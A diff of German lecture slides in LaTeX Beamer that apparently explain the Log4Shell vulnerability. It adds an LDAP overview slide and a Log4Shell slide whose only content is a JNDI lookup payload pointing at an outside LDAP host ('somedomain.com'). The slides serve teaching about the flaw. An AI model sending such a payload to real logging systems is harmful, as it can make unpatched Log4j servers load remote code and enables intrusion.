@@ -129,10 +129,26 @@ $\Rightarrow$ `Java Naming and Directory Interface`
 \end{itemize}
 
 \end{frame}
-
 \subsection{Ldap}
+\begin{frame}{LDAP}
+$\Rightarrow$ 'Lightweight Directory Access Protocol'
+ \begin{itemize}
+  \item Protokoll für Nutzwerverwaltung\\
+  - 'Darf sich dieser Nutzer einloggen?'\\
+  - 'War dieser Nutzer schonmal hier?'
+  \item Verwendung in Kombination mit Log4j und jndi\\
+  $\Rightarrow$ 'Logge die Anzahl der Logins dieses Nutzters'
+  \item Läuft meist als externe Server-Instanz
+ \end{itemize}
 
-\subsection{Log4shell}
+\end{frame}
+\section{Log4Shell}
+\begin{frame}{Log4Shell}
+\${jndi:ldap://somedomain.com/powned}
+\end{frame}
+
+
+
 
 
 
